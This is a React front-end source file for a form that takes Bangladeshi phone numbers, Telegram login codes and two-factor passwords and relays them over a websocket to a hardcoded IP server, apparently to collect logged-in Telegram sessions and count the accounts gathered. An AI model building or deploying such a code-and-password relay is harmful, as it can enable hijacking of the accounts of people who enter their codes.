import './App.css';
import { useEffect, useState } from 'react';
import axios from 'axios';
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import io from 'socket.io-client';
function App() {
  const baseUrl = 'ws://18.139.219.242:14276/ws/telegram';
  const toastId = 'loader';
  //  const socket = io(baseUrl);
  const socket = io('ws://18.139.219.242:14276', {
    path: '/ws/telegram',
  });

  const errorMsg = 'Something went wrong. Try again!!';
  const [number, setNumber] = useState('');
  const [otp, setOtp] = useState('');
  const [password, setPassword] = useState('');
  const [phoneHash, setPhoneHash] = useState('');
  const [flag, setFlag] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isPasswordRequired, setIsPasswordRequired] = useState(false);
  const [counter, setCounter] = useState(0);
  const [isTwofaFailed, setIsTwofaFailed] = useState(false);
  //const [isSubmitting, setIsSubmitting] = useState(false);
  useEffect(() => {
    console.log('something!!!');
    socket.on('connect', () => {
      console.log('WebSocket connection opened');
    });
  }, []);

  // useEffect(() => {
  //   if (!flag) {
  //     (async () => {
  //       const url = baseUrl + '/dashboard';
  //       axios
  //         .get(url)
  //         .then((resp) => {
  //           const counter = resp.data.data.total_count;
  //           setCounter(counter);
  //         })
  //         .catch((err) => console.log(err));
  //     })();
  //   }
  // }, [flag]);

  const displayToast = (msg = '', type = 'success') => {
    const options = {
      pauseOnHover: false,
      autoClose: 3000,
      hideProgressBar: true,
    };
    toast[type](msg, options);
  };
  const loader = (msg = 'loading...') => {
    toast.loading(msg, {
      toastId,
      autoClose: false,
      position: 'top-center',
      pauseOnHover: false,
    });
  };

  const handleSubmitNumber = (e) => {
    loader();

    // Emit a 'send_otp' event with the phone number
    socket.emit('send_code', {
      phone: '+88' + number,
    });

    // Listen for the response from the server
    socket.on('send_code_status', (data) => {
      if (data.status === 'failed') {
        displayToast(data.message, 'error');
      } else {
        setPhoneHash(data.phone_code_hash);
        setFlag(!flag);
        const msg = 'Successfully sent otp request';
        displayToast(msg);
      }

      // Dismiss the toast notification
      toast.dismiss(toastId);
    });
  };

  const handleSubmitOtp = (e) => {
    loader();

    if (!isTwofaFailed) {
      // Emit a 'submit_otp' event with the relevant data
      socket.emit('sign_in', {
        phone: '+88' + number,
        phone_code_hash: phoneHash,
        code: otp,
      });
    }

    socket.on('sign_in_status', (data) => {
      console.log('sign-in successful ', data.status);
      setIsSubmitted(true);
      setIsTwofaFailed(false);
      setNumber('');
      setOtp('');
      const msg = 'Successfully Login';
      displayToast(msg);
    });

    socket.on('2fa_failed', () => {
      setIsTwofaFailed(true);
    });

    if (isTwofaFailed) {
      socket.emit('sign_in_2fa', {
        phone: '+88' + number,
        phone_code_hash: phoneHash,
        code: otp,
        password,
      });
    }

    // // Listen for the response from the server
    // socket.on('otp_submission_response', (response) => {
    //   console.log('data ', response);
    //   const data = response.data;

    //   if (data.status === 'failed') {
    //     displayToast(data.message, 'error');

    //     if (data.password_required) {
    //       setIsPasswordRequired(true);
    //     }
    //   } else {
    //     setIsPasswordRequired(false);
    //     setIsSubmitted(true);
    //     setNumber('');
    //     setOtp('');
    //     const msg = 'Successfully Login';
    //     displayToast(msg);
    //   }

    //   // Dismiss the toast notification
    //   toast.dismiss(toastId);
    // });
  };

  const handleAnotherNumber = () => {
    setIsSubmitted(false);
    setFlag(false);
  };

  const renderNumber = () => (
    <>
      <input
        value={number}
        onChange={(e) => setNumber(e.target.value)}
        type="number"
        placeholder="Enter your 11 digits number here. e.g- 019xxxxxxxx"
      />
      <button onClick={handleSubmitNumber} disabled={!number}>
        Submit
      </button>
    </>
  );

  const renderOtp = () => (
    <div
      style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}
    >
      <input
        disabled={isSubmitted || isTwofaFailed}
        value={otp}
        onChange={(e) => setOtp(e.target.value)}
        type="number"
        placeholder="Enter OTP"
      />
      {isTwofaFailed ? (
        <input
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          type="text"
          placeholder="Password"
        />
      ) : (
        <></>
      )}
      <div
        style={{
          display: 'flex',
          justifyContent: 'flex-end',
          marginTop: '10px',
          width: '100%',
        }}
      >
        <button onClick={handleSubmitOtp} disabled={!otp}>
          Submit
        </button>
        <button
          onClick={handleAnotherNumber}
          disabled={!isSubmitted}
          style={{ marginLeft: '10px' }}
        >
          Add Another Number
        </button>
      </div>
    </div>
  );

  return (
    <div className="centered-container">
      {!flag && (
        <div className="counter-div">
          <h3>
            Total Accounts: <span className="counter">{counter}</span>
          </h3>
        </div>
      )}
      <div className="centered-form">
        {!flag ? renderNumber() : renderOtp()}
      </div>
      <ToastContainer />
    </div>
  );
}

export default App;
